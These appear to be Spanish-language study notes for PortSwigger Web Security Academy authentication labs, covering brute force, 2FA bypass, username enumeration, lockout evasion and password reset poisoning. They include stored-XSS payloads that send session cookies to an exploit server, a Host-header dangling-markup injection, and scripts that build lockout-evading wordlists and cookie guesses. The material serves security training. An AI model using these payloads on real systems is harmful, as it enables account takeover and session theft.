1. Bruteforce con Intruder y las listas de user:pass por default de portswigger
2. 2FA, metes codigo y te redirige a /my-account, intentas entrar como carlos y pones en la url directamente /my-account y te saltas el 2FA
3. Password reset te manda un correo, y en el link de reseteo, al capturar ves que viaja el id, lo cambias a 'carlos' y ya estaría
4. El mensaje cambia un poco dependiendo de si el usuario existe o no, usamos 'grep-extract':
![[Pasted image 20260723130413.png]]
5. Si nos meten timeout entre solicitudes fallidas, usamos la siguiente cabecera:
![[Pasted image 20260723131634.png]]

6. Cada 2 login incorrectos nos bloquea hasta que hacemos un login valido, asi que sacamos un payload para users y otro para passwords:
```python
for i in range (0,200):
	if i % 3 == 0:
		print("wiener")
	else:
		print("carlos")
```

```python
with open("burp_pass") as f:
	lines = f.readlines()

i = 0
for line in lines:
	if i % 3 == 0:
		print("peter")
	else:
		print(line.strip())
	i++

```

7. Bruteforce del 2FA von ?verify=carlos y un ataque Sniper de 0000 a 9999, y robando su cookie
8. La cookie de sesion ('stay-logged-in') se crafteaba haciendo 'username:pass' siendo la pass un hash md5 y luego encodeada en base 64, entonces definimos lo siguiente y probamos cada contraseña:
![[Pasted image 20260723142532.png]]
![[Pasted image 20260723143117.png]]
9. Lo mismo que antes con la cookie pero la passwd no está en la wordlist. Pero tenemos un XSS en un comentario, cogemos la cookie de 'stay-logged-in' con ese XSS mandandonoslo al exploit-server, pillamos la cookie del Access-Log y hacemos decrypt :)
10. La cabecera X-Forwarded-Host te cambia la url desde donde viene la solicitud, por tanto podemos redirigir a nuestro exploit server:
![[Pasted image 20260723201032.png]]
![[Pasted image 20260723201059.png]]
![[Pasted image 20260723201116.png]]

11. Campo de 'forgotten passwd' si pones una passwd distinta en ambos para confirmar la nueva sale un error distinto que si pones la contraseña original erroneamente:
![[Pasted image 20260723202243.png]]
![[Pasted image 20260723202257.png|177]]
![[Pasted image 20260723202340.png]]
![[Pasted image 20260723202330.png]]

12. Borras por completo el campo 'current_password':
![[Pasted image 20260817172758.png]]

--------------------------------------------------------------------------
### Cookie Stay-Logged In

![[Pasted image 20260810211659.png]]

```
Cookie del tipo Base64(username:password(mD5))
En usernames List, tengo listo todo encodeado a base64 y las passwords a MD5
```

```
Con Passwords List: (si no existe rate limit)
1. username=victimUser&password=[burp Intruder] //302 OK
2. username=[burp Intruder]&password=password Victim //Grep Match "Invalid username or password" -- O el mensaje de error que salga, para que el no retorne ese grep, es el username correcto, luego llevar el mismo ataque pero con password y esperar el 302 Ok
3. Cluster Bomb: X-Forwarded-For:[Burp intruder] 
	1. username=[burp intruder]&password=peter5peter5peter5peter5++;
	La password tiene mas o menos unas 20 veces repetidas la contra peter5 para  poder alcanzar una longitud de 100 caracteres y que sea diferenciable los tiempos de recibidos para cuando tome el username correcto (peter5 solo es testeo)
	2. Luego de que nos de una respuesta diferencial, solo es cuestión de probar ahora para el parametro password=[burp intruder] y que nos de 302oK
```


### Authentication enumeration `username & password` Via different Responses: `fetch('/analytics?id` 

* El secreto está en grepear las response para ver las diferentes errores que son los que nos dan la pauta para ver si es o no el username y password correct (iniciamos primero con username y luego con passwords)
	* podemos grepear por el error que aparece `Invalid username or password.`
	* Un `.` o una `,` hacen la fucking diferencia. 
	* Y con contraseñas se grepea por `Invalid username or password`

* Ese fetch de analytics solo es pa' confundir y perder el tiempo en un falso positivo. 

* Basicamente hacemos con intruder la enumeracion de username y password sin embargo teniendo muy en cuenta las respuestas que dan, pueden variar `password incorrect` o un `username incorrect` y esas serán la clave para poder definir y darnos cuenta cual es el username y password correcto. 
* Porque claro en este caso el desarrollador que hizó esto no pensó en la seguridad en lo más minimo y pensó que estaba en el primer semestre de la universidad creando condicionales hasta de por si acaso : ) 


![[Pasted image 20260810211713.png|389]]

### Stay-logged-in Offline Crack `XSS Stored` `hash md5`

* Si el hash no se desencripta con alguna tool, busco directamente el hash en internet a ver si aparece. 

> The blog application comment function is vulnerable to [stored XSS](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#stored-xss), use the below payload in blog comment to send the session cookie of Carlos to the exploit server.

```
<script>
document.location='https://EXPLOIT.net/StealCookie='+document.cookie
</script>
```

> Base64 decode the `stay-logged-in` cookie value and use an online **MD5** hash crack station database.

[![stay-logged-in Offline](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/stay-logged-in-offline.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/stay-logged-in-offline.png)

[PortSwigger Lab: Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

### Autentication protección brute force block IP

Y si, lo que tuvimos que hacer fue configurar los .txt de user para crear uno nuevo que tuviese la siguiente estructura:

La lista de password y username 100 veces las tengo en: 

* `/Users/juanfelipeoz/Documents/user-100-veces.txt`

* `/users/juanfelipeoz/Documents/password-100-veces.txt`

```arduino
wiener
carlos
wiener
carlos 
.
.
. #así hasta que carlos se repitiera 100 veces. 
```

y hacer un passwords_auth.txt para las contraseñas:

```arduino
peter 
randomPass
peter
randomPass
peter
randomPass
. 
.
. Así sucesivamente para poder alinear las contraseñas del diccionario con el user carlos. (randomPass es de la lista de contraseñas de portswigger)
```

Ahora bien, ¿por qué tenemos que añadir tantas veces a **wiener**? por que esta es una forma de bypassear los intentos de inicio de sesión en una aplicacion, como ya tenemos el username **wiener**, con el podemos reiniciar la cuenta de bloqueos de IP para varios intentos fallidos de inicio de sesión, y si por eso lo hacemos así, para que **Carlos** que es el username victima que conocemos pueda ir probando cada contraseña del diccionario hasta que nos arroje un **302**.

### Username enumeration via response timing `bypass brute force blocked by IP`  `X-Forwarded-For`

* Dejo pendiente este lab para volver a hacerlo!!!

* Para este caso este lab la funcionalidad de login está protegida bajo el ataque de brute force sin embargo podemos saltarnos este WAF mediante una tecnica `Añadiendo` el header X-Forwarded-For en la request, ¿cómo? vamos a ver -> 
* Un consejo: tomamos la request de POST login/ y le damos >Param miner>Guess Headers en caso tal de que encontremos un escenario muy similar durante el BSCP. 

```js
1. Tomamos el POST /login HTTP/2 y lo mandamos pa intruder
2. Creamos un ataque de tipo Pitchfork
3. Seleccionamos como 1er parametro de posición el X-Forwarded-For:[intruder] y que será de tipo Numbers del 1-100 Step 1. 
4. Seleccionamos como 2do parametro de posición el username=[intruder] y de tipo simple list y añadimos la lista de usernames que tenemos. 
5. En el parametro de password lo añadimos con una contraseña la primera valida y las demás incorrectas con el fin de que sea larga y genere una diferencia en las responses ejm: username=peterPeter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5Peter5
//MAS O MENOS UNAS 20 VECES REPETIDA LA PASSWORD INCORRECTA. 
6. Start Attack y analizar muy bien las responses reflejadas `Response Received` es muy grande ahi veremos el username reflejado. 
7. Hacemos todo el ataque de nuevo está vez con el username=USERNAME-IDENTIFICADO y en esta ocasión la password=[intruder] con su parametro de posición y la lista de passwords la pegamos, y el X-Forwarded-For:[intruder] tal cual lo mismo de 1-100 de tipo numbers Step 1. 
8. Analizamos la respuesta `302` y listo ese ese!
```

### Autentication bloqueo de cuenta: 

```
* username=[burp intruder]&password=a[burp intruder] de tipo cluster bomb el primer payload para usernames list el segundo payloads de **null payloads** hasta lograr encontrar una length diferente a las demás, ya luego tirar el ataque con: 
* username=victimusername&password=[tubro intruder] y grepear los resultados pa' pillar el que difiere. 
```

###  Autentication multiples credenciales por solicitud JSON

![[Pasted image 20260810211753.png]]

```json
{"username":"carlos",
"password":["123456","password","12345678",
"qwerty","123456789","12345","1234",
"111111","1234567","dragon","123123",
"baseball","abc123","football","monkey",
"letmein","shadow","master","666666",
"qwertyuiop","123321","mustang","1234567890",
"michael","654321","superman","1qaz2wsx",
"7777777","121212","000000","qazwsx",
"123qwe","killer","trustno1","jordan",
"jennifer","zxcvbnm","asdfgh","hunter",
"buster","soccer","harley","batman","andrew",
"tigger","sunshine","iloveyou","2000","charlie",
"robert","thomas","hockey","ranger","daniel",
"starwars","klaster","112233","george","computer",
"michelle","jessica","pepper","1111","zxcvbn","555555",
"11111111","131313","freedom","777777","pass","maggie",
"159753","aaaaaa","ginger","princess","joshua","cheese",
"amanda","summer","love","ashley","nicole","chelsea",
"biteme","matthew","access","yankees","987654321",
"dallas","austin","thunder","taylor","matrix",
"mobilemail","mom","monitor","monitoring",
"montana","moon","moscow"]}
```

### Autenticación simple bypass 2FA:

Si primero se le solicita al usuario que ingrese una contraseña y luego se le solicita que ingrese un código de verificación en una página separada, el usuario se encuentra efectivamente en un estado de "iniciar sesión" antes de ingresar el código de verificación. En este caso, vale la pena probar para ver si puede pasar directamente a las páginas "solo para quienes han iniciado sesión" después de completar el primer paso de autenticación. Ocasionalmente, encontrará que un sitio web en realidad no verifica si completó o no el segundo paso antes de cargar la página.

### Autenticacion lógica rota 2FA: 

Si encontramos un mfa-code=[turbo intruder] de tipo payload>brute force, con el min y max de length segun esté establecido el mfa-code y letras a-z-0-9 pero si solo son numeros entonces 0-9. 

### Autentication password cracking online: `stay-logged-in` `XSS Stored comments`

![[Pasted image 20260810211806.png]]

```js
<script>
document.location='https://EXPLOIT.net/StealCookie='+document.cookie
</script>

<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

Nos llega la cookie de session y simplemente la decodeamos como sea necesario, base64>md5>take password. 

### Autentication password reset poisoning

Para este caso con solo tomar el endpoint ==POST forgot-password/ HTTP/1.1==
y el Host: exploit-server.net y cambiamos el username a el victimUser podemos lograr que nos llegue a nuestro server exploit el token de reset password. 

![[Pasted image 20260810211818.png]]

### Autentication Password reset poisoning via Middleware `X-Forwarded-Host:`

Hacemos lo mismo del anterior, y nos llega el token de reset, y algo importante a tener en cuenta es que el token lo tendremos que revisar en el **access log** del server. 
![[Pasted image 20260810211836.png]]

![[Pasted image 20260810211844.png]]

### Autentication brute force cambio de contraseña

Algo util y logico es si se cambia la contraseña y el error de las nuevas contraseñas si son diferentes retornan: "New Passwords Dont Match" esta a sujeta a aparecer pero si la contraseña actual es correcta, por lo tanto si una contraseña está incorrecta tira de primeraso es "Current Password is incorrect", por lo tanto un burp intruder a contraseña actual y grepear por "new passwords dont match" el que lo filtre y saque el resultado, esa es la password, actual. 

### Autentication password reset via Dangling Markup 

En este caso, el ataque es en el endpoint `POST forgot-password/ HTTP/1.1` que lo estructuramos y se puede inyectar en el header Host. 
![[Pasted image 20250215131349.png]]

```
Host: web-security-academy.com:'<a img src="EXPLOIT-SERVER.NET/?
Cambiamos el param de user al userVictim claro, nos llega el correo a nuestro exploit server, tomamos la password nueva y listo. 

```

---

```
Brute force username enumeration with burp (user grep extract to notice differences)

Brute force username with Pitchfork attack, X-Forwarded-For: 1-100 and really long password(100 chars), this results in a response timing recieved(Also used to bypass IP restrictions)

Bypass IP restriction by aleterating with a valid login (wiener/carlos/wiener/carlos... passwords=peter/fake1/peter/fake2...) Pitchfork resource pool 1

Bypass 2FA by loading /my-account instead of entering a code tu the user

2FA is sent depending on a parameter that you can change (ex: change verify parameter to carlos, send the GET request, and brute force 4 digits 2FA the POST req)

Burte force a stay logged in cookie (ex: base64(carlos:md5password))

You can abuse password reset by changing username in repeater

Use X-Forwarded-Host: exploit-0a35005c0457e3ad81c374f701750043.exploit-server.net to intercept forgot password token in your log

Password change abuse: 
Remove current password lets you change any password
or
username=wiener&current-password=INVALID&new-password-1=DIFFERENT&new-password-2=THATHIS -> invalid current password
brute -> username=carlos&current-password=§INVALID§&new-password-1=DIFFERENT&new-password-2=THATHIS
```

## Python para encodear el username:password con `carlos:`

A MD5 y el base64 con el user como carlos:paswordMD5

```python
import base64
import hashlib
 
# encoding GeeksforGeeks using md5 hash
# function 
f = open('pass','r')

data = f.read()

for x in data.split('\n'):
	temp = hashlib.md5(x.encode()).hexdigest()
	print(base64.b64encode(b'carlos:'+str(temp).encode()))
```
